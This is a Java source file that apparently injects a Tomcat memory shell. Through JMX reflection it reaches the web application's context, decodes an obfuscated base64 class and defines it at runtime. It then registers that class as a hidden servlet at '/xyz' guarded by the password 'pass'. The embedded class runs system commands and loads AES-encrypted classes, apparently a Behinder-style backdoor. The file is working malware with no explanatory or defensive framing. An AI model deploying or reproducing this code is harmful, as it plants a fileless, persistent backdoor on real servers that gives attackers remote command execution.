package com.memshell.tomcat;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.ApplicationServletRegistration;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.modeler.Registry;
import sun.misc.BASE64Decoder;

import javax.management.DynamicMBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Set;

public class ServletBasedWithoutRequestVariant extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        try{
            String servrletName = "myServlet";
            String urlPattern = "/xyz";
            final String password = "pass";

            MBeanServer mbeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object obj = field.get(mbeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository  = (Repository) field.get(obj);

            Set<NamedObject> objectSet =  repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
            for(NamedObject namedObject : objectSet){
                DynamicMBean dynamicMBean = namedObject.getObject();
                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                obj = field.get(dynamicMBean);

                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
                field.setAccessible(true);
                StandardContext standardContext = (StandardContext)field.get(obj);

                if(standardContext.findChild(servrletName) == null){
                    System.out.println("[+] Add Dynamic Servlet");

                    Wrapper wrapper = standardContext.createWrapper();
                    wrapper.setName(servrletName);
                    standardContext.addChild(wrapper);

                    BASE64Decoder base64Decoder = new BASE64Decoder();
                    String codeClass = "yv66vgAAADMBOAoAUACKCQBPAIsKAIwAjQoAjACOCgAGAI8HAJAIAJEHAJIHAGMJAJMAlAoACACVBwCWCgAIAJcIAJgHAJkKAA8AigoADwCaCgCbAJwKAJMAnQoAmwCeCQBPAJ8HAKAKABYAoQcAogoAGAChBwCjCgAaAKEKAE8ApAkApQCmCACnCgCoAKkIAIYLAKoAqwgArAoArQCuCgCtAK8HALAKALEAsgoAsQCzCgC0ALUKACUAtggAtwoAJQC4CgAlALkLALoAuwoAvACpCAC9BwC+CgAwAIoIAL8KADAAwAoAwQDCCgAwAMMKADAAxAgAxQoArQDGCgCtAMcLAKoAyAgAyQsAygDLCgC8AMwIAM0KAM4AzwcA0AsAygDRCgCtANIKAEAA0woAzgDUCwCqANUKANYA1woAzgDYBwDZCgAIANoIANsHANwHAN0HAN4KAE0AoQcA3wcA4AEACHBhc3N3b3JkAQASTGphdmEvbGFuZy9TdHJpbmc7AQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABZQEAIUxqYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uOwEAC2NsYXNzTG9hZGVyAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAVjbGF6egEABm1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEY29kZQEABWJ5dGVzAQACW0IBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQAtTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb247AQAEdGhpcwEALUxjb20vbWVtc2hlbGwvZ2VuZXJpYy9EeW5hbWljU2VydmxldFRlbXBsYXRlOwEADVN0YWNrTWFwVGFibGUHAN8HAOEHANkHAJIHAOIHAJYHAKAHAKIHAKMBAAZkb1Bvc3QBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEACkV4Y2VwdGlvbnMBAAVkb0dldAEABnJlc3VsdAEAA2NtZAEAA2tleQEABmNpcGhlcgEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADmV2aWxDbGFzc0J5dGVzAQAJZXZpbENsYXNzAQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABHR5cGUHAN4BAApTb3VyY2VGaWxlAQAbRHluYW1pY1NlcnZsZXRUZW1wbGF0ZS5qYXZhDABVAOMMAFEAUgcA5AwA5QDmDADnAOgMAOkA6gEAEGphdmEvbGFuZy9PYmplY3QBAAtkZWZpbmVDbGFzcwEAD2phdmEvbGFuZy9DbGFzcwcA6wwA7ABUDADtAO4BAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uDADvAOoBAxB5djY2dmdBQUFETUFHd29BQlFBV0J3QVhDZ0FDQUJZS0FBSUFHQWNBR1FFQUJqeHBibWwwUGdFQUdpaE1hbUYyWVM5c1lXNW5MME5zWVhOelRHOWhaR1Z5T3lsV0FRQUVRMjlrWlFFQUQweHBibVZPZFcxaVpYSlVZV0pzWlFFQUVreHZZMkZzVm1GeWFXRmliR1ZVWVdKc1pRRUFCSFJvYVhNQkFDUk1ZMjl0TDIxbGJYTm9aV3hzTDJkbGJtVnlhV012VFhsRGJHRnpjMHh2WVdSbGNqc0JBQUZqQVFBWFRHcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjanNCQUF0a1pXWnBibVZEYkdGemN3RUFMQ2hiUWt4cVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSTdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFGWW5sMFpYTUJBQUpiUWdFQUMyTnNZWE56VEc5aFpHVnlBUUFLVTI5MWNtTmxSbWxzWlFFQUVrMTVRMnhoYzNOTWIyRmtaWEl1YW1GMllRd0FCZ0FIQVFBaVkyOXRMMjFsYlhOb1pXeHNMMmRsYm1WeWFXTXZUWGxEYkdGemMweHZZV1JsY2d3QUR3QWFBUUFWYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeUFRQVhLRnRDU1VrcFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQUlRQUNBQVVBQUFBQUFBSUFBQUFHQUFjQUFRQUlBQUFBT2dBQ0FBSUFBQUFHS2l1M0FBR3hBQUFBQWdBSkFBQUFCZ0FCQUFBQUJBQUtBQUFBRmdBQ0FBQUFCZ0FMQUF3QUFBQUFBQVlBRFFBT0FBRUFDUUFQQUJBQUFRQUlBQUFBUkFBRUFBSUFBQUFRdXdBQ1dTdTNBQU1xQXlxK3RnQUVzQUFBQUFJQUNRQUFBQVlBQVFBQUFBZ0FDZ0FBQUJZQUFnQUFBQkFBRVFBU0FBQUFBQUFRQUJNQURnQUJBQUVBRkFBQUFBSUFGUT09AQAWc3VuL21pc2MvQkFTRTY0RGVjb2RlcgwA8ADxBwDiDADyAPMMAPQA9QwA9gD3DABTAFQBACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgwA+ADjAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAK2phdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25UYXJnZXRFeGNlcHRpb24MAHoAdAcA+QwA+gD7AQAeWytdIER5bmFtaWMgU2VydmxldCBzYXlzIGhlbGxvBwD8DAD9AFYHAP4MAP8BAAEABWJhc2ljBwDhDADbAQEMAQIBAwEAEWphdmEvdXRpbC9TY2FubmVyBwEEDAEFAQYMAQcBCAcBCQwBCgELDABVAQwBAAJcQQwBDQEODAEPARAHAREMARIBEwcBFAEACGJlaGluZGVyAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBAAAMARUBFgcBFwwBGAEZDAEVARoMARsBEAEAAS0MARwBHQwBHgEfDAEgASEBAAF1BwEiDAEjASQMASUAVgEAA0FFUwcBJgwBJwEoAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBKQEqDAErASwMAFUBLQwBLgEvDAEwATEHATIMATMBEAwBNAE1AQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyDAE2ATcBAAZlcXVhbHMBABxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0AQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQArY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY1NlcnZsZXRUZW1wbGF0ZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldAEAEGphdmEvbGFuZy9TdHJpbmcBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAMoKVYBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADWdldFN1cGVyY2xhc3MBAAxkZWNvZGVCdWZmZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAB2lzRW1wdHkBAAMoKVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5qYXZhL3V0aWwvVVVJRAEACnJhbmRvbVVVSUQBABIoKUxqYXZhL3V0aWwvVVVJRDsBAC0oTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAB3JlcGxhY2UBAEQoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7TGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KUxqYXZhL2xhbmcvU3RyaW5nOwEACXN1YnN0cmluZwEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAMc2V0QXR0cmlidXRlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQAFcHJpbnQBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFu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";
                    byte[] bytes = base64Decoder.decodeBuffer(codeClass);

                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
                    Method method = null;
                    Class clz = cl.getClass();
                    while(method == null && clz != Object.class ){
                        try{
                            method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        }catch(NoSuchMethodException ex){
                            clz = clz.getSuperclass();
                        }
                    }
                    method.setAccessible(true);
                    Class clazz = (Class) method.invoke(cl, bytes, 0, bytes.length);

                    wrapper.setServletClass(clazz.getName());
                    wrapper.setServlet((Servlet) clazz.getDeclaredConstructor(String.class).newInstance(password));
                    ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
                    registration.addMapping(urlPattern);
                }
            }
        }catch(Exception e){
            e.printStackTrace();
        }
    }
}